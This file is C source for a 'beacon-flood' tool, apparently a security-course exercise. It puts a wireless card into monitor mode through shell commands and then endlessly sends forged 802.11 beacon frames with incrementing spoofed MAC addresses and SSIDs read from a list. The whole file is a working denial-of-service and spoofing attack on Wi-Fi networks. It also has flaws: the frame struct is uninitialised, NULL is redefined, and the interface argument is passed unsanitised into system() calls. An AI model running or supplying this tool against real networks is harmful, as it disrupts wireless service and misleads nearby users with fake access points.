#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "beacon.cpp"
#define NULL 0x00

void monitor(char * dev){ // 랜카드 모니터 모드로 변경 함수
    char command[100];
    sprintf(command, "ifconfig %s down",dev);
    system(command);
    sprintf(command, "iwconfig %s mode monitor",dev);
    system(command);
    sprintf(command, "ifconfig %s up",dev);
    system(command);
}

void usage(){
    printf("syntax: beacon-flood <interface> <ssidFile>\n");
    printf("sample: beacon-flood wlan0 ssid-list.txt\n");
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        usage();
        return 0;
    }

    char * dev = argv[1];
    char * ssidFile = argv[2];
    char errbuf[PCAP_ERRBUF_SIZE];

    if(strlen(dev)>30){ // 버퍼 오버플로우 방지
        printf("interface name length less than 30 characters");
        return -1;
    }
    monitor(dev);

    pcap_t* pcap = pcap_open_live(dev , BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    FILE* pFile = fopen(ssidFile, "rb");
    if (pFile == NULL){
        printf("File not Found!\n");
        return -1;
    }

    struct beacon_frame fake_bframe;

    while (1) {
        //change MAC
        if(fake_bframe.beacon.shost[5] == 0xff){
            fake_bframe.beacon.shost[5] = 0x00;
            fake_bframe.beacon.shost[4]++;
            if(fake_bframe.beacon.shost[4]==0xff){
                fake_bframe.beacon.shost[4] = 0x00;
                fake_bframe.beacon.shost[3]++;
                if(fake_bframe.beacon.shost[3]==0xff){
                    fake_bframe.beacon.shost[3] = 0x00;
                    fake_bframe.beacon.shost[2]++;
                    if(fake_bframe.beacon.shost[2]==0xff){
                        fake_bframe.beacon.shost[2] = 0x00;
                        fake_bframe.beacon.shost[1]++;
                        if(fake_bframe.beacon.shost[1]==0xff){
                            fake_bframe.beacon.shost[1] = 0x00;
                        }
                    }
                }
            }
        }
        fake_bframe.beacon.shost[5]++;
        memcpy(fake_bframe.beacon.bssid, fake_bframe.beacon.shost, 6);

        //ssid name list
        char strTemp[32];
        memset(strTemp,0x00,32);
        if(!feof(pFile)) fgets(strTemp, sizeof(strTemp),pFile);
        else fseek(pFile,0,SEEK_SET);
        if (strTemp[0]==0x00) continue; //ssid가 비어있으면 continue
        strTemp[strlen(strTemp)-1] = 0x00;
        memcpy(fake_bframe.tag_ssid.ssid, strTemp, 32);

        if (pcap_sendpacket(pcap, (unsigned char*)&fake_bframe, sizeof(fake_bframe)) != 0){
            printf("Fail sendpacket\n");
            exit (-1);
        }

        printf(" [BSSID]: %02x:%02x:%02x:%02x:%02x:%02x | [SSID]: %s | send packet!\n",fake_bframe.beacon.bssid[0],fake_bframe.beacon.bssid[1],fake_bframe.beacon.bssid[2]
                                                                                      ,fake_bframe.beacon.bssid[3],fake_bframe.beacon.bssid[4],fake_bframe.beacon.bssid[5]
                                                                                      ,fake_bframe.tag_ssid.ssid);
        usleep(100);
    }
    fclose(pFile);
    pcap_close(pcap);
}
